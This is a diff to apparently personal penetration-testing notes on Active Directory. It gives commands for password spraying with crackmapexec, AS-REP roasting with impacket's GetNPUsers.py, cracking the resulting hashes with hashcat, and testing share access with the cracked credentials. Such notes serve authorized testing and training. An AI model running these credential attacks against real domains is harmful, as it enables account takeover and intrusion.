@@ -64,18 +64,20 @@ Windows usage AD timestamp could be converted to human readable at https://www.e
 1. Fire
 	- Run in TMUX or some session as it is going to take some time.
 	- `crackmapexec smb 10.10.10.10 -u userlist.out -p pwlist.txt`
-1. [impacket](https://github.com/SecureAuthCorp/impacket)
-	- GetNPUsers.py
+1. ASREPRoast with [impacket](https://github.com/SecureAuthCorp/impacket) 
+	- `GetNPUsers.py`
 		- For users that do not require kerberos preauthentication.
+			- Below command would give hash upon success using that we can crack the hash using correct id.
 			- `./GetNPUsers.py dc-ip 10.10.10.10 -request 'nullbrain.local/' -format hashcat`
 	- Check hash type
 		- `./hashcat --example-hashes | grep -i <hash_string>`
 		- ensure and get id <18200>
 	- crack the hash
 		- `./hashcat -m <18200> hashes/my-stored-hash /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule`
-			- rules for cracking
-1. Check if compromised user from above has access.
-	- `crackmapexec smb 10.10.10.10 -u <username> -p <password>`
+			- rules for cracking, good to start with `InsidePro-PasswordsPro.rule`
+3. Check if compromised user from above has access.
+	- `crackmapexec smb 10.10.10.10 -u <username> -p <password>` , Or,
+	- `crackmapexec smb 10.10.10.10 -u <username> -p <password> --shares 
 	- Pawned?
 		- if Not
-			- Finding Passwords in SYSVOL & Exploiting Group Policy Preferences <TODO>
+			- Finding Passwords in SYSVOL & Exploiting Group Policy Preferences [winPEAS checks group policy] (https://github.com/nullbr41n/nullbrain/tree/main/active-directory/winrm.md)
